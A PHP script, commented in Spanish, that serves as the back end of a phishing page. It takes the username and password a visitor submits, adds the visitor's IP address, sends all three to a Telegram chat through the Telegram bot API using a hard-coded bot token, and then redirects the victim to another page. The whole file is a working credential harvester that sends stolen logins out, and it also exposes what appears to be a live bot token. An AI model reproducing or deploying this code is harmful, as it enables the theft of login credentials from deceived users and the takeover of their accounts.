<?php
// Configuración del bot de Telegram
$botToken = "8198531920:AAEvRL0O26Hs5cdjTRsImltuxQGMlIKqCHk";
$chatId = "-4695344087";

// Capturar la IP del usuario
$userIP = $_SERVER['REMOTE_ADDR'];

// Obtener los datos enviados desde el formulario
$username = htmlspecialchars($_POST['username']);
$password = htmlspecialchars($_POST['password']);

// Crear el mensaje para enviar a Telegram
$message .= "Userr: " . $username . "\n";
$message .= "Contra: " . $password . "\n";
$message .= "IP: " . $userIP;

// URL de la API de Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Configurar los datos para enviar a Telegram
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

// Enviar la solicitud a Telegram
$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Redirigir al usuario a una página de confirmación o a otra URL
header("Location: w1.html"); // Cambiar la URL de redirección si es necesario
exit();
?>